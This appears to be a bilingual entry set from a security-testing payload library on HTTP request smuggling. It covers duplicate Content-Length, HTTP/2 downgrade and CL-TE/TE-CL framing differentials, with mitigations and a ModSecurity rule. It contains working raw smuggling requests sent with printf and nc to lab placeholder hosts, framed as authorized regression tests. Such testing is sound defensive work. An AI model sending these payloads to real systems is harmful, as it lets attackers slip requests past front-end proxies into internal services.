description.zh: 保留冒号前空白的解析差异样例并替换内部管理目标；只在授权多级代理 echo 链中验证各跳是否一致拒绝。
description.en: Retain the pre-colon whitespace parsing variant while replacing internal administrative targets. Validate only in an authorized multi-hop echo chain that every hop rejects it consistently.

description.zh: 逗号分隔的 CL 列表命中"split 取首段"与"整体解析/拒收"的解析差分：不同代理层对同一列表取值不同即产生分帧歧义。成功判据：SMUGGLED 滞留后端队列（下一请求异常或显著超时）。失效条件：所有层一致拒收列表形态。
description.en: A comma-separated Content-Length list hits the parsing differential between taking the first value and rejecting the whole list: proxy layers that pick different values from the same list create framing ambiguity. Success: SMUGGLED stays queued on the backend, visible as a broken or timing-out next request. Failure condition: every layer consistently rejects list-shaped values.

explanation.zh: 逗号列表，命中取首段与整体拒收的差分
explanation.en: comma list hitting the first-value versus reject-whole differential

explanation.zh: 滞留后端队列的走私标记
explanation.en: smuggling marker expected to stay queued on the backend

title.zh: 发送重复 Content-Length 探测

description.zh: 用原始 TCP 向 echo 路径发送两个不同 Content-Length 的 POST；RFC 要求直接拒绝该类报文，若出现正常响应或单值被采纳即锁定前后端对 CL 仲裁的分歧。
description.en: Send a raw TCP POST carrying two different Content-Length values to the echo path; RFC mandates rejection, so any normal response or silent adoption of one value exposes the parsers' disagreement.

description.zh: 把第二个完整请求写进正文并声明冲突的 CL 值，使两端对正文归属判断不一致；两跳请求计数出现分歧或第二请求被独立处理即走私成功。
description.en: Place a second full request in the body with conflicting CL values so the two hops disagree on body ownership; diverging request counts or independent handling of the second request confirm smuggling.

attackChain.payload:
printf 'POST /echo/PAYLOADER_SMUGGLE_CL_CL_E2 HTTP/1.1
Host: {LAB_SMUGGLE_HOST}
Content-Length: 29
Content-Length: 0
Connection: close

GET /echo/second HTTP/1.1

' | nc {LAB_SMUGGLE_HOST} {LAB_SMUGGLE_PORT}

title.zh: 持久连接验证稳定利用

description.zh: 在 keep-alive 连接上重发第 2 步的双请求结构，走私请求在连接复用时仍被后端独立解析；代理与后端日志请求数不一致即确认可稳定利用。
description.en: Replay the step-2 dual-request structure over a keep-alive connection; if the smuggled request is still parsed independently and proxy/backend log counts diverge, the primitive is stably exploitable.

attackChain.payload:
printf 'POST /echo/PAYLOADER_SMUGGLE_CL_CL_E3 HTTP/1.1
Host: {LAB_SMUGGLE_HOST}
Content-Length: 47
Content-Length: 0
Connection: keep-alive

GET /echo/PAYLOADER_SMUGGLE_SECOND HTTP/1.1

' | nc {LAB_SMUGGLE_HOST} {LAB_SMUGGLE_PORT}

description.zh: 经 HTTP/2 降级以 content-length:0 携带正文发送；h2 分帧与 HTTP/1.1 的 CL 仲裁不一致使走私消息到达后端，即绕过前端对重复 CL 头的严格拦截。
description.en: Downgrade through HTTP/2 sending a body alongside content-length:0; the mismatch between h2 framing and HTTP/1.1 CL arbitration lets the smuggled message reach the backend past strict CL filtering.

attackChain.payload:
:method: POST
:path: /echo/PAYLOADER_SMUGGLE_H2_CL_CL
:authority: {LAB_SMUGGLE_HOST}
content-length: 0

PAYLOADER_SMUGGLE_H2_BODY

overview.zh: 该 Payload 覆盖重复 Content-Length 的拒绝与回归场景，检验代理链是否按 RFC 一致拒绝歧义报文，防止 CL.CL 分歧演化为走私。验证维度含重复 CL 原始请求、双消息边界与持久连接样例，对应第 1 至第 3 步。
overview.en: This payload covers duplicate Content-Length rejection regression, testing whether the proxy chain uniformly rejects ambiguous messages per RFC so CL.CL divergence cannot evolve into smuggling. Validation covers a raw duplicate-CL request, a dual-message boundary, and a keep-alive sample, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对重复 Content-Length 的仲裁规则不一致：一端取首值另一端取末值或直接放行，消息边界随之错位，剩余字节被解析为独立请求。
vulnerability.en: The root cause is inconsistent arbitration of duplicate Content-Length values between front and back ends: one takes the first value, another the last or accepts outright, shifting message boundaries so leftover bytes parse as an independent request.

exploitation.zh: 第 1 步用 printf 构造携带两个不同 CL 值的原始 POST 并以套接字发送到授权 echo 路径，前后端都应返回 400；第 2 步发送双消息边界样例，按两跳日志的请求计数判断第二请求是否出现；第 3 步在 keep-alive 连接上重复验证持久连接行为。任一后端执行第二条请求即确认拒绝缺失。占位符在全局变量菜单替换。
exploitation.en: In step 1, build a raw POST with two different CL values via printf and socket it to the authorized echo path; both ends should return 400. In step 2, send the dual-message boundary sample and judge second-request appearance from hop-log request counts. In step 3, repeat on a keep-alive connection for persistence behavior. Any backend executing the second request confirms missing rejection. Replace placeholders via the global variables menu.

mitigation.zh:
所有层级对重复或冲突的 Content-Length 一律 400 并断开连接，网关在入口完成仲裁与规范化；链路统一使用 HTTP/2 消除分帧歧义。
    # ModSecurity：重复 Content-Length 直接拒绝
    SecRule &REQUEST_HEADERS:Content-Length "@gt 1" \
        "id:1010,phase:1,deny,status:400,msg:'duplicate Content-Length'"
    listen 443 ssl http2;   # 前后端统一 h2，报文不再歧义定界
mitigation.en: Every layer must return 400 and close on duplicate or conflicting Content-Length, with the gateway normalizing at ingress. After the fix, replay steps 1 through 3: ambiguous messages should all be rejected and hop counts agree.

analysis.zh: HTTP 重复 Content-Length 拒绝回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。

A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

overview.zh: 该 Payload 覆盖 HTTP 请求走私的消息边界分歧场景，检验代理链对 Content-Length 与 Transfer-Encoding 的分帧取舍是否一致。验证维度含 CL-TE、TE-CL 基础形态与重复 TE 头的 TE-TE 混淆，对应第 1 至第 3 步。
overview.en: This payload covers HTTP request-smuggling message-boundary divergence, testing whether the proxy chain frames messages consistently between Content-Length and Transfer-Encoding. Validation covers basic CL-TE and TE-CL forms plus duplicate-TE TE.TE confusion, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对同一报文选择不同的消息定界标准：一端按 Content-Length、另一端按 chunked 结束，多余字节被并入后续请求，攻击者借此把任意请求走私进内网。
vulnerability.en: The root cause is front and back ends choosing different framing standards for the same message: one delimits by Content-Length while the other honors chunked framing, so leftover bytes merge into the next request and attackers can smuggle arbitrary requests into the internal network.

exploitation.zh: 第 1 步发送 CL 与 TE 并存的原始请求，SMUGGLED 被解析为下一条请求或出现超时差异即确认 CL-TE；第 2 步交换定界方向构造 TE-CL 请求，剩余分帧进入第二条请求即确认；第 3 步发送重复 TE 头，两端仲裁不一致即确认 TE-TE。用原始套接字发送避免客户端改写。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, send the raw CL-plus-TE message; SMUGGLED parsed as the next request or a timeout difference confirms CL-TE. In step 2, flip framing to TE-CL; leftover chunks entering the second request confirm it. In step 3, send duplicate TE headers; inconsistent arbitration confirms TE-TE. Send via raw sockets to avoid client rewriting. Replace placeholders via the global variables menu; see wafBypass for variants.

mitigation.en: Gateways must reject CL-plus-TE coexistence and duplicate TE headers, unify framing standards across the chain, refuse ambiguous messages, and keep parser implementations aligned. After the fix, replay steps 1 through 3: ambiguous requests should get 400 and hop request counts must agree.

analysis.zh: HTTP CL-TE 消息边界回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
